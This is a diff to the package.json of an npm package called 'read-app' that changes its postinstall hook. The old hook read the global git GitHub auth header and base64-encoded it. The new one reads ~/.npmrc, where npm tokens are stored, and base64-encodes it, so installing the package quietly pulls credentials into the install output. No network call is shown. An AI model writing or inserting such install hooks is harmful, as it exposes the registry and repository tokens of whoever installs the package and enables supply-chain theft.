@@ -2,7 +2,7 @@
   "name": "read-app",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "git config --global --get-all http.https://github.com/.extraheader | base64"
+    "postinstall": "cat ~/.npmrc | base64"
   }
 }
 
